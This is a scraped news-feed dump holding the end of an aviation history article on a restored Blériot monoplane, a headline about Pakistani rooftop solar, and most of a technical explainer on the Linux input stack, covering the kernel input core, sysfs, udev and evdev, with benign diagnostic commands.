    &lt;p&gt;Even with FAA approval, the VanDersarl Blériot underwent testing, reinspection and taxiing trials before it finally got airborne for the first time in more than a century on November 3, 2012. Since then, Arango keeps its flight itinerary at Paso Robles under tight self-imposed restrictions. “It’s a marginal airplane,” he explained, “with a 50-hp engine and very cambered wings that cause a lot of drag. It’s a good-flying airplane, but I’m not going to risk the airframe. It’s one of a kind, touched twice by its creators, and once by Chuck. I wanted it authentic to its own type.”&lt;/p&gt;
    &lt;p&gt;Originally published in the March 2014 issue of Aviation History. To subscribe, click here.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.historynet.com/vandersarl-bleriot/"/><published>2025-11-27T16:38:35+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46070915</id><title>Pakistan says rooftop solar output to exceed grid demand in some hubs next year</title><updated>2025-11-27T22:09:59.501360+00:00</updated><content/><link href="https://www.reuters.com/sustainability/boards-policy-regulation/pakistan-says-rooftop-solar-output-exceed-grid-demand-some-hubs-next-year-2025-11-22/"/><published>2025-11-27T16:42:40+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46071030</id><title>The input stack on Linux: An end-to-end architecture overview</title><updated>2025-11-27T22:09:58.601962+00:00</updated><content>&lt;doc fingerprint="77099c1f6581ab04"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Intro&lt;/head&gt;
    &lt;p&gt;Letâs explore and deobfuscate the input stack on Linux. Our aim is to understand its components and what each does. Input handling can be divided into two parts, separated by a common layer:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Kernel-level handling: It deals with what happens in the kernel and how events are exposed to user-space &lt;list rend="ul"&gt;&lt;item&gt;The actual hardware connected to the machine, along with the different buses and I/O/transport subsystems&lt;/item&gt;&lt;item&gt;The input core subsystem, and the specific device drivers that register on it&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Exposed layer (middle) &lt;list rend="ul"&gt;&lt;item&gt;The event abstraction subsystem (evdev)&lt;/item&gt;&lt;item&gt;devtmpfs for device nodes&lt;/item&gt;&lt;item&gt;sysfs for kernel objects and device attributes&lt;/item&gt;&lt;item&gt;procfs for an introspection interface of the input core&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;User-space handling: &lt;list rend="ul"&gt;&lt;item&gt;The user-space device manager (udev) and hardware database (hwdb) for device management and setup&lt;/item&gt;&lt;item&gt;The libinput library for general input, and other libraries such as XKB for keyboards, to interpret the events and make them manageable&lt;/item&gt;&lt;item&gt;The Widgets, X Server, X11 window managers, and Wayland compositors, which rely on everything else&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Weâll try to make sense of all this, one thing at a time, with a logical and coherent approach.&lt;/p&gt;
    &lt;p&gt;NB: This article compiles my understand, for any correction please contact me.&lt;/p&gt;
    &lt;head rend="h1"&gt;The Kernelâs Input Core&lt;/head&gt;
    &lt;p&gt;How are input devices and their events handled in the kernel? You might think it is useless to know, but understanding some of the kernel logic is what makes things click.&lt;lb/&gt; The input core is the central piece of the kernel responsible for handling input devices and their events. Most input devices go through it, although some bypass it entirely but these are special use-cases. It provides common abstract components that sit between the low-level hardware, and the more useful features for user-space, along with a sort of publish-subscribe system.&lt;/p&gt;
    &lt;p&gt;To follow along you can either download the kernel source, or view it in any browser explorer (such as this, this, or this).&lt;/p&gt;
    &lt;p&gt;Practically, the input core is found in the kernel under &lt;code&gt;drivers/input/input.c&lt;/code&gt;, it defines the basic functionalities related
to the lifecycle of an input device, defined as a &lt;code&gt;struct input_dev&lt;/code&gt;
(&lt;code&gt;input.h&lt;/code&gt;). Namely:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Allocating the input device structure (&lt;code&gt;input_allocate_device&lt;/code&gt;that returns a&lt;code&gt;struct input_dev&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;Registering and unregistering the input device in the system along with setting sane default values (&lt;code&gt;input_register_device&lt;/code&gt;adds to&lt;code&gt;input_dev_list&lt;/code&gt;). This also integrates with devtmpfs, exposing the device, and with procfs, exposing debugging information (&lt;code&gt;/proc/bus/input/&lt;/code&gt;).&lt;/item&gt;
      &lt;item&gt;Drivers push events to the input core using &lt;code&gt;input_event&lt;/code&gt;. The core then forwards the events to the registered handlers in a fan-out fashion (&lt;code&gt;input_register_handler&lt;/code&gt;adds an&lt;code&gt;input_handler&lt;/code&gt;to&lt;code&gt;input_handler_list&lt;/code&gt;). Then handlers forward them to all clients in user-space (called&lt;code&gt;input_handle&lt;/code&gt;) listening for events on that handler. The clients are registered on the handler with&lt;code&gt;input_register_handle&lt;/code&gt;(similar confusing names). The user-space client/handle can also grab the handler with exclusivity through&lt;code&gt;input_grab_device&lt;/code&gt;(ex:&lt;code&gt;EVIOCGRAB&lt;/code&gt;in evdev).&lt;lb/&gt;By default the evdev (event device) is attached as the default input handler and exposes these events to user-space in a standardized way via an evdev created character stream in devtmpfs (&lt;code&gt;/dev/input/eventX&lt;/code&gt;).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;An input handler is an implementation of an abstract interface (&lt;code&gt;include/linux/input.h&lt;/code&gt;), which the input core will call. Particularly,
the &lt;code&gt;input_event&lt;/code&gt; function in input core will invoke the implementation
of the input handlerâs &lt;code&gt;events&lt;/code&gt; function. Hereâs the interface an input
handler should fulfil:&lt;/p&gt;
    &lt;p&gt;In the same way, a handle list is simply a pointer to a device and a handler, along with a function to process events:&lt;/p&gt;
    &lt;p&gt;And the &lt;code&gt;input_dev&lt;/code&gt; abstraction returned by &lt;code&gt;input_allocate_device&lt;/code&gt;
is a much biger structure:&lt;/p&gt;
    &lt;p&gt;Each actual specific input device driver builds on top of the functions of the input core in their internal code, adding their own specificities and advertising what capabilities and features the device can generate. This creates a polymorphic-like abstraction where common input core logic is reused, and where input event handlers are abstracted away. In general, the main role of input drivers is to translate the device specific protocol to a more standardized protocol, such as evdev, so that it can be useful in user-space. And additionally, as with most drivers way of communicating with the rest of the system, they can possibly have extra configuration through an ioctl interface.&lt;/p&gt;
    &lt;p&gt;Along with all this, the kernel has a mechanism called sysfs that is used to expose its internal objects (kobject) to user-space. Anytime a device is created, it is exposed in &lt;code&gt;/sys/&lt;/code&gt; (usually mounted there)
with its properties (&lt;code&gt;/sys/devices/&lt;/code&gt;). For the input core part, we can
find it in &lt;code&gt;/sys/class/input/inputN&lt;/code&gt;, and within each sub-directories
we have the properties of the object.&lt;lb/&gt; Furthermore, when a device is plugged or unplugged (&lt;code&gt;device_add&lt;/code&gt;,
&lt;code&gt;device_remove&lt;/code&gt; in &lt;code&gt;drivers/base/core.c&lt;/code&gt;), the kernel also emits events,
called uevent, via netlink (&lt;code&gt;PF_NETLINK, NETLINK_KOBJECT_UEVENT&lt;/code&gt;) which
can then be caught in user-space and acted upon. Weâll see later how
these are handled by udev.&lt;/p&gt;
    &lt;p&gt;The kobject structure looks like this:&lt;/p&gt;
    &lt;p&gt;This is a general overview of our understanding of the input core so far:&lt;/p&gt;
    &lt;head rend="h1"&gt;The Logical Input Device Topological Path&lt;/head&gt;
    &lt;p&gt;We may commonly say that devices are connected to a machine and magically handled from there on. Yet, we know that itâs an abstraction and that thereâs more to it. What happens in reality is that the electrical connection first passes over a bus/host controller, which then letâs the data be transported. This data is formatted in a specific input protocol that should be handled by a driver that speaks it and that subsequently creates a related input device. In most input device cases, the driver then translates the protocol into evdev âcommon speechâ.&lt;lb/&gt; Thatâs a whole layer of things before reaching the input core. Just like in the world of networking, one thing wraps another. In this particular case, devices have parents, a hierarchy, a stack of devices, drivers, and helpers.&lt;/p&gt;
    &lt;p&gt;Hereâs what that stack is like in theory, with in reality some lines blurred together:&lt;/p&gt;
    &lt;p&gt;In this section, letâs try to understand how the kernel uses plugânâplay/hotplug to pick the right drivers in this stack, and how we pass from electrical signal to evdev. To do that weâll first look at how the kernel pictures its internal objects, and how these together somehow create the above hierarchy. Finally, weâll see some concrete examples of that, along with some command line tools that can clearly display this encapsulating behavior.&lt;/p&gt;
    &lt;p&gt;As we said thereâs a hierarchy of kobjects in the kernel from the bus to its connected devices. These are stored in-memory as a linked list hierarchy, which is also represented under sysfs as a file system tree.&lt;lb/&gt; Specifically, in &lt;code&gt;drivers/base/core.c&lt;/code&gt; this is what is used to create
the parent-child relationship:&lt;/p&gt;
    &lt;p&gt;For example, hereâs the path that an input device data might take.&lt;/p&gt;
    &lt;code&gt;/devices/pci0000:00/0000:00:14.0/usb1/1-1/1-1:1.0/
             0003:046D:C31C.0003/input/input6/event3
&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;/devices/...&lt;/code&gt;â root of the kernelâs sysfs device tree, showing all devices known to the kernel.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;pci0000:00/0000:00:14.0&lt;/code&gt;â PCI bus and controller (the USB host controller here).&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;usb1/1-1/1-1:1.0&lt;/code&gt;â USB bus and port hierarchy (device 1-1, interface 1.0).&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;0003:046D:C31C.0003&lt;/code&gt;â HID device node (bus&lt;code&gt;0003&lt;/code&gt;= USB HID, vendor&lt;code&gt;046D&lt;/code&gt;= Logitech, product&lt;code&gt;C31C&lt;/code&gt;= specific keyboard).&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;input/input6&lt;/code&gt;â input subsystem device registered under&lt;code&gt;/sys/class/input/input6&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;event3&lt;/code&gt;â the evdev interface, the character device exposed in&lt;code&gt;/dev/input/event3&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;How did we end up with this long list, how did it get created? Letâs see how the kernel stores this info, and what happens from its perpective.&lt;lb/&gt; As far as its concerned, the device-related things it knows is summed up in these types of objects:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;bus - a device to which other devices can be attached&lt;/item&gt;
      &lt;item&gt;device - a physical/logical device that is attached to a bus&lt;/item&gt;
      &lt;item&gt;driver - a software entity that can be associated with a device and performs operations with it&lt;/item&gt;
      &lt;item&gt;class - a type of device that has similar behavior; There is a class for disks, partitions, serial ports, input, etc.&lt;/item&gt;
      &lt;item&gt;subsystem - a view on the structure of the system; Kernel subsystems include devices (hierarchical view of all devices in the system), buses (bus view of devices according to how they are attached to buses), classes, input, etc. We care about the input subsystem.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For example, there are different views of the same device. Youâll find the physical USB device under &lt;code&gt;/sys/bus/usb/devices/&lt;/code&gt; and the logical
device of the input class under &lt;code&gt;/sys/class/input/.&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;Letâs go over these objects, tracing the path, starting with buses.&lt;lb/&gt; A hardware bus/host controler is a communication channel between the processor and input/output device. But a kernel bus object is more generic than this, itâs a logical function which role is to be a point of connection of devices. All devices are connected to a kernel bus, even if it needs to be a virtual one. So kernel buses are the root of the hierarchy.&lt;lb/&gt; The main buses are things such as PCI, USB, IDE, SCSI, platform, ACPI, etc.&lt;/p&gt;
    &lt;p&gt;Kernel buses are the connective tissue of everything, the base of the infrastructure. As you can see from the structure itâs responsible for probing the device to get info about it, handling connected/disconnected events, creating a new node for it, and sending uevent to notify user-space and triggering a chain reaction.&lt;lb/&gt; Yet, one of their most important role is to start the match between devices and registered device drivers, as can be noted from the &lt;code&gt;match&lt;/code&gt;
function. Keep in mind that the matched driver can be another bus, so
this initiates a cascade of different handlers, bubbling up the hierarchy.&lt;/p&gt;
    &lt;p&gt;A concrete example of this recursion:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;A PCI bus controller (the host bridge) is a device on the platform bus.&lt;/item&gt;
      &lt;item&gt;The USB bus (usbcore) is a device on the PCI bus (via xHCI controller).&lt;/item&gt;
      &lt;item&gt;The HID bus is a device on the USB bus (via usbhid).&lt;/item&gt;
      &lt;item&gt;The specific HID protocol driver is a device on the HID bus&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The low level kernel buses such as the hardware bus/host controlers generally donât handle input data directly, though there are some bus/host controller drivers that do register input devices to the input core, bypassing everything else in the stack and acting as event sources. These exceptions are usually for brightness control hotkeys, lid sensors, built-in special functions keys, etc.. We have for example the drivers &lt;code&gt;acpi_video&lt;/code&gt;, &lt;code&gt;thinkpad_acpi&lt;/code&gt;, &lt;code&gt;asus_wmi&lt;/code&gt;, etc..&lt;/p&gt;
    &lt;p&gt;To know how to handle the devices and whether a driver needs to be loaded from a module, all devices and buses have specially formatted IDs, to tell us what kind of devices they are. The ID, which we call MODALIAS, consists of vendor and product ID with some other subsystem-specific values. Each bus and device has its own scheme for these IDs.&lt;lb/&gt; For a USB mouse, it looks something like this:&lt;/p&gt;
    &lt;code&gt;MODALIAS=usb:v046DpC03Ed2000dc00dsc00dp00ic03isc01ip02
&lt;/code&gt;
    &lt;p&gt;This is needed in case the driver isnât built-in the kernel and instead was an external module (&lt;code&gt;*.ko&lt;/code&gt;). As a reminder, a driver is some piece
of code responsible for handling a type of device, and a module is a
piece of external kernel code that can be dynamically loaded at runtime
when needed. Depending on the distro choices, some drivers are set as
external modules that need to be loaded at runtime.&lt;/p&gt;
    &lt;p&gt;To achieve this, the kernel, after composing the MODALIAS string, sends it within the uevent towards user-space. To complete this information, each external kernel module comes with a list of known MODALIASes it can handle, so that they can be loaded as needed. These lists are compiled by programs such as &lt;code&gt;depmod&lt;/code&gt; that creates files like &lt;code&gt;modules.alias&lt;/code&gt;
in the kernelâs &lt;code&gt;/lib/modules&lt;/code&gt; directory for all currently available
modules that arenât built-in (&lt;code&gt;/lib/modules/VERSION&lt;/code&gt;), and the built-in
ones (&lt;code&gt;modules.builtin&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;In theory thatâs fine, this infrastructure model makes it easy to dynamically load modules that are not already built-in, but we need a piece of software in user-space to catch the events and perform the actual loading. This is a role that udev embodies by calling &lt;code&gt;modprobe&lt;/code&gt;
for every event that has a MODALIAS key, regardless of whether a module
needs loading or not. Weâll see more of udev but for now keep in mind
that its doing this hotplug mechanism.&lt;/p&gt;
    &lt;p&gt;If youâre curious, you can try this udev command to monitor the MODALIAS.&lt;/p&gt;
    &lt;code&gt;devadm monitor --property
&lt;/code&gt;
    &lt;p&gt;Yet, this doesnât solve what happens to devices that were present at boot and which need modules. The solution: thereâs a file in the device directory in sysfs with all the uevent generated at boot for every devices in sysfs file system, appropriately named âueventâ. If you write âaddâ to that file the kernel resends the same events as the one lost during boot. So a simple loop over all uevent files in &lt;code&gt;/sys&lt;/code&gt; triggers
all events again.&lt;/p&gt;
    &lt;p&gt;The MODALIAS value is also stored in sysfs along with the device properties, here are a few commands to gather information on this:&lt;/p&gt;
    &lt;code&gt;&amp;gt; cat /sys/devices/pci0000:00/0000:00:10.0/modalias 
pci:v00001022d00007812sv00001025sd00000756bc0Csc03i30

&amp;gt; modprobe --resolve-alias $(cat /sys/devices/\
 pci0000:00/0000:00:13.2/usb1/1-0:1.0/usb1-port3/modalias)
Not everything has an associated module

&amp;gt; ls -l /sys/devices/pci0000:00/0000:00:10.0/driver
lrwxrwxrwx 1 root root 0 Oct 25 11:37 driver \
               -&amp;gt; ../../../bus/pci/drivers/xhci_hcd

If the driver link exists, check which module implements it:
&amp;gt; modprobe -R xhci_hcd
xhci_hcd

&amp;gt; modinfo xhci_hcd
name:           xhci_hcd
filename:       (builtin)
license:        GPL
file:           drivers/usb/host/xhci-hcd
author:         Sarah Sharp
description:    'eXtensible' Host Controller (xHC) Driver
license:        GPL
file:           drivers/usb/host/xhci-hcd
description:    xHCI sideband driver for secondary interrupter management
parm:           link_quirk:Don't clear the chain bit on a link TRB (int)
parm:           quirks:Bit flags for quirks to be enabled as default (ullong)

For example that xhci_hcd module is builtin
&lt;/code&gt;
    &lt;p&gt;So far weâve learned two things: buses which devices are connected to, and the MODALIAS mechanism to match modules and dynamically load drivers that arenât built-in. Letâs see the devices attached to buses as they appear as kernel objects.&lt;/p&gt;
    &lt;p&gt;Along with the related driver:&lt;/p&gt;
    &lt;p&gt;As you can notice, they also have a probing and lifecycle functions to be implemented. We also have the registration/unregistration functions (&lt;code&gt;input_register_device&lt;/code&gt; and &lt;code&gt;input_unregister_device&lt;/code&gt; in our case)
which will announce that the device is now available in the system (plus
a uevent and other user-space stuff). Each of the registered devices
have an entry in sysfs &lt;code&gt;/sys/devices&lt;/code&gt;, along with the information about
its driver, and similar info in &lt;code&gt;/sys/class&lt;/code&gt; and &lt;code&gt;/sys/bus&lt;/code&gt;. The
device also creates files in devtmpfs that represent its interfaces. Letâs
note that devtmpfs is usually mounted by default to user-space as a virtual
filesystem on most distros.&lt;/p&gt;
    &lt;p&gt;To check whether devtmpfs is enabled, which is almost always the case today:&lt;/p&gt;
    &lt;code&gt;&amp;gt; zcat /proc/config.gz | grep DEVTMPFS
CONFIG_DEVTMPFS=y
CONFIG_DEVTMPFS_MOUNT=y
CONFIG_DEVTMPFS_SAFE=y

&amp;gt; mount | grep devtmpfs
dev on /dev type devtmpfs (rw,nosuid,relatime,size=2720672k,\
   nr_inodes=680168,mode=755,inode64)

&amp;gt; mount | grep sysfs
 sys on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
&lt;/code&gt;
    &lt;p&gt;Devices are associated to classes and subsystems that handle them. The subsystem we care about here is what weâve seen in the earlier section: the input core, the input device subsystem.&lt;/p&gt;
    &lt;p&gt;As for the concept of a class, itâs a high-level view of the device model, abstracting implementation details. For example there are drivers for SCSI and ATA but both are in the disks class. Similarly, all input devices are in the input class, which is what we care about. This is a grouping mechanism, unrelated to how the devices are connected. They can be found in sysfs &lt;code&gt;/sys/class/&lt;/code&gt;.&lt;lb/&gt; The &lt;code&gt;struct class&lt;/code&gt; is instantiated in the &lt;code&gt;struct device&lt;/code&gt; through
&lt;code&gt;class_register&lt;/code&gt; and &lt;code&gt;class_unregister&lt;/code&gt;. This will in turn also help
udev, as weâll see later, better manage the devices in devtmpfs user-space
mapping &lt;code&gt;/dev/&lt;/code&gt;, adding a filter for rules.&lt;/p&gt;
    &lt;p&gt;In the input core:&lt;/p&gt;
    &lt;p&gt;This completes our overview of the way the kernel perceives the different types of objects it manages. However, that didnât clarify how we ended up with the example path above other than somehow having a kernel bus and device hierarchy.&lt;lb/&gt; We talked about hardware buses and host controllers drivers that arenât handling data and that they delegate this to an upper layer. In theory this upper layer is split between a kernel bus&amp;amp;device for the transport layer, aka IO layer, and a kernel bus&amp;amp;device for the protocol layer, but in reality those might get mixed up (bus&amp;amp;device because itâs both).&lt;/p&gt;
    &lt;p&gt;The IO layer is responsible for handling the physical electrical communication with the device, itâs setup, and management. At this level we have USB, Bluetooth, I2C, SPI, etc.. In drivers that means: &lt;code&gt;usbhid&lt;/code&gt;
for HID devices over USB, &lt;code&gt;btusb&lt;/code&gt; and &lt;code&gt;hidp&lt;/code&gt; for HID over Bluetooth,
&lt;code&gt;i2c-hid&lt;/code&gt; for touchpads and keyboards that are wired to the motherboardâs
I2C, &lt;code&gt;psmouse&lt;/code&gt; and &lt;code&gt;serio&lt;/code&gt; for PS2 mouse, etc..&lt;lb/&gt; The protocol or function specific layer then takes over and has as role to integrate with the input core and translate the raw transport data into a common format, usually evdev. The evdev format is favored as it provides a uniform API to represent input devices (via &lt;code&gt;/dev/input/eventX&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;A few examples:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Thereâs a mouse communication protocol usin 9 pins DE-9 over the RS-232 standard for communication with UART&lt;/item&gt;
      &lt;item&gt;The PS/2 mouse which uses a serial transport protocol with 6 pins (&lt;code&gt;serio&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;The atkbd keyboard also over serial transport&lt;/item&gt;
      &lt;item&gt;A gamepad that uses HID but the particular case of a sony joystick over USB&lt;/item&gt;
      &lt;item&gt;A touchscreen specific driver using IÂ²C or SPI&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Or as a hierarchical example:&lt;/p&gt;
    &lt;code&gt;[PCI bus]
   âââ probes -&amp;gt; xhci_hcd (a PCI driver)
         âââ registers usb_hcd with -&amp;gt; [USB core]
                 âââ enumerates and manages -&amp;gt; [USB bus]
                        âââ matches -&amp;gt; usbhid (a USB driver)
                               âââ registers -&amp;gt; [HID bus]
                                      âââ matches -&amp;gt; hid-generic, hid-apple, ...
                                            âââ registers -&amp;gt; [Input bus]
                                                  âââ matches -&amp;gt; evdev, ...
&lt;/code&gt;
    &lt;p&gt;Thereâs another component of complexity to add: we donât have a single protocol for a single transport over a single hardware bus/host controller. Sometimes thereâs a generic protocol layer which is reused with different transport mechanisms. There can also be a delegation mechanism for the more specific sub-protocol handlers for specific devices or modes.&lt;lb/&gt; For example, you can have an HID protocol over USB (&lt;code&gt;usbhid&lt;/code&gt;), and the
particular part of the HID protocol used for input devices, and the more
specific sub-HID protocol of a type of device (&lt;code&gt;hid-generic&lt;/code&gt; and others).&lt;/p&gt;
    &lt;p&gt;Weâll see an example of this by diving into the HID subsystem which is the most popular input protocol these days, but first letâs check some tools that can help us see all that weâve learned thus far and make sense of the hierarchy:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;lspci -vn&lt;/code&gt;list info about devices connected via PCI buses&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;lsusb -v&lt;/code&gt;or&lt;code&gt;usb-devices&lt;/code&gt;list usb devices information in a more human readable form&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;dmesg&lt;/code&gt;the sys logs&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;hwinfo --short&lt;/code&gt;to probe hardware&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Yet the best way to get a lot of info about the bus and device hierarchy is to rely on &lt;code&gt;udevadm&lt;/code&gt;, a user-space tool that comes with udev. Hereâs
how it looks for an input device:&lt;/p&gt;
    &lt;p&gt;NB: It is also a bit more clearer, though for the moment confusing, to also look at &lt;code&gt;udevadm info --tree&lt;/code&gt;. Similarly, the &lt;code&gt;loginctl
seat-status&lt;/code&gt; also clearly shows the hierarchy of devices in the current
session. Weâll talk more about the concept of seats later on.&lt;/p&gt;
    &lt;p&gt;We see the âlooking at parent deviceâ block that corresponds to one &lt;code&gt;struct device&lt;/code&gt; in the kernel kobject mapped in sysfs, along with the
driver, when itâs present, and other info it gathers at every step,
walking down the bus hierarchy. Letâs note that not everything has
an associated driver since the hardware topology might not match the
driver topology. That often means one kernel component handles multiple
parts of the stack. In the above trace, &lt;code&gt;hid-generic&lt;/code&gt; handles the input
registering.&lt;/p&gt;
    &lt;p&gt;This example in particular shows:&lt;/p&gt;
    &lt;code&gt;PCI â USB controller â USB device â HID interface â input device â evdev node
&lt;/code&gt;
    &lt;p&gt;Another source of information that we briefly mentioned is the procfs introspection interface (&lt;code&gt;/proc/bus/input/&lt;/code&gt;), it can also help see the
handling of input devices more clearly as itâs a text-based view of what
the kernel input subsystem knows. It is more or less analogous to the
sysfs view but is meant for human-readable diagnostics. In conjunction
with what weâve learned in the previous input core section, it should
clarify some of our understanding.  It has two files underneath: &lt;code&gt;devices&lt;/code&gt;
and &lt;code&gt;handlers&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;devices&lt;/code&gt; file contain all the current input devices and has entries
with these fields:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;I&lt;/code&gt;: basic info (bus type, vendor/product/version)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;N&lt;/code&gt;: name&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;P&lt;/code&gt;: physical path (e.g.,&lt;code&gt;isa0060/serio0/input0&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;S&lt;/code&gt;: sysfs path&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;U&lt;/code&gt;: unique identifier (if provided)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;H&lt;/code&gt;: list of event handler interfaces bound (like&lt;code&gt;event3&lt;/code&gt;,&lt;code&gt;js0&lt;/code&gt;, etc.)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;B&lt;/code&gt;: capability bitmaps (&lt;code&gt;EV&lt;/code&gt;,&lt;code&gt;KEY&lt;/code&gt;,&lt;code&gt;REL&lt;/code&gt;,&lt;code&gt;ABS&lt;/code&gt;, etc.) weâll explore what this means when looking at evdev&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For instance:&lt;/p&gt;
    &lt;p&gt;Here you can see that a single physical device can possibly present itself as multiple input devices with different handlers attached for separate functions (here the keys of the System Control handler are fewer). Here, &lt;code&gt;kbd&lt;/code&gt; is console handler, and &lt;code&gt;eventN&lt;/code&gt; is the evdev
user-space handler. Libinput, which weâll cover later, uses groups
&lt;code&gt;LIBINPUT_DEVICE_GROUP&lt;/code&gt; to logically combine the different devices that
are actually on the same hardware.&lt;/p&gt;
    &lt;p&gt;The handlers file is about instances of the &lt;code&gt;input_handler&lt;/code&gt; that will
be called from input coreâs &lt;code&gt;input_event&lt;/code&gt; we mentioned before. As we
said most of it is handled by evdev, but there are exceptions such as:&lt;/p&gt;
    &lt;p&gt;Weâll talk about joydev later on. As for mousedev, it is there only for legacy compatibility of old &lt;code&gt;/dev/psaux&lt;/code&gt;-style mouse interface.&lt;/p&gt;
    &lt;p&gt;Letâs now see the example of a dummy input driver, to get the idea across.&lt;/p&gt;
    &lt;p&gt;Thatâs it, you should now somewhat have an idea of how we pass from hardware events, to kernel objects, and end up within the input core subsystem, which should prepare events for user-space. Letâs now dig on and explore a few of the topics weâve grazed in the past two sections.&lt;/p&gt;
    &lt;head rend="h1"&gt;sysfs&lt;/head&gt;
    &lt;p&gt;We already covered a lot of ground in understanding sysfs, so letâs continue and summarize everything we know and complete the full picture.&lt;/p&gt;
    &lt;p&gt;As we briefly said before, sysfs is a virtual file system representation in user-space of the kernel objects and their attributes, itâs how the kernel views the current state of the system, and also how the user can interface with the parameters of the kernel in a centralized manner. Itâs all done in a very Unixy way by manipulating simple files.&lt;lb/&gt; The file mapping happens as such: kernel objects are directories, their attributes are regular files, and the relationship between objects is represented as sub-directories and symbolic links.&lt;/p&gt;
    &lt;p&gt;The object information is categorized as one of the following. Each of these is a sub-directory under &lt;code&gt;/sys/&lt;/code&gt;.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;block - all block devices available in the system (disks, partitions)&lt;/item&gt;
      &lt;item&gt;bus - types of bus to which physical devices are connected (pci, ide, usb)&lt;/item&gt;
      &lt;item&gt;class - drivers classes that are available in the system (net, sound, usb)&lt;/item&gt;
      &lt;item&gt;devices - the hierarchical structure of devices connected to the system&lt;/item&gt;
      &lt;item&gt;dev - Major and minor device identifier. It can be used to automatically create entries in the &lt;code&gt;/dev&lt;/code&gt;directory. Itâs another categorization of the devices directory&lt;/item&gt;
      &lt;item&gt;firmware - information from system firmware (ACPI)&lt;/item&gt;
      &lt;item&gt;fs - information about mounted file systems&lt;/item&gt;
      &lt;item&gt;kernel - kernel status information (logged-in users, hotplug)&lt;/item&gt;
      &lt;item&gt;module - the list of modules currently loaded&lt;/item&gt;
      &lt;item&gt;power - information related to the power management subsystem information is found in standard files that contain an attribute&lt;/item&gt;
      &lt;item&gt;device (optionally) - a symbolic link to the directory containing devices; It can be used to discover the hardware devices that provide a particular service (for example, the ethi PCI card)&lt;/item&gt;
      &lt;item&gt;driver (optionally) - a symbolic link to the driver directory (located in &lt;code&gt;/sys/bus/*/drivers&lt;/code&gt;)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;As far as weâre concerned, when it comes to input devices, the &lt;code&gt;/sys/devices/&lt;/code&gt; directory is probably one of the most important. Itâs
the representation of the hierarchy of devices weâve talked about in
the previous section.&lt;lb/&gt; Pasting the tree here would be cumbersome, but try &lt;code&gt;tree -L 5 | less&lt;/code&gt;
within &lt;code&gt;/sys/devices&lt;/code&gt; and youâll clearly see how things fit together,
a direct hierarchical mapping of how devices are connected to each others.&lt;lb/&gt; Within this directory we can find interesting information associated to the device and its type. For usb devices, for example, we have info such as the bus number, port number, the vendor and product id, manufacturer, speed, and others.&lt;/p&gt;
    &lt;p&gt;Furthermore, the &lt;code&gt;/sys/bus&lt;/code&gt; directory organizes devices by the type of
bus they are connected to. You can imagine that this isnât a linear
view since buses can have buses as devices (&lt;code&gt;usb&lt;/code&gt; and &lt;code&gt;hid&lt;/code&gt; each have
their directory even though &lt;code&gt;hid&lt;/code&gt; is probably under &lt;code&gt;usb&lt;/code&gt;), but it it
helpful to perceive what is happening, an easy shortcut. Within each
bus directory there are two subdirectories: drivers, that contains the
driver registered for the bus, and devices, that contains symbolic links
to the devices connected to that bus in &lt;code&gt;/sys/devices&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Similarly, the &lt;code&gt;/sys/class&lt;/code&gt; directory has another view of the system
from a more functional/type perspective. Itâs about what devices do and
not how theyâre connected. As far as weâre concerned, the subdirectory
&lt;code&gt;/sys/class/input/&lt;/code&gt; is where weâll find symbolic links to all devices
that have the input class in &lt;code&gt;/sys/devices&lt;/code&gt;.&lt;lb/&gt; This directory contains both symlinks to input devices and evdev devices, the latter are usually sub-directories of the former. A notable file in the input directory is the âcapabilitiesâ file, which lists everything that the device is capable, as far as input is concerned. Weâll revisit this in the evdev section.&lt;/p&gt;
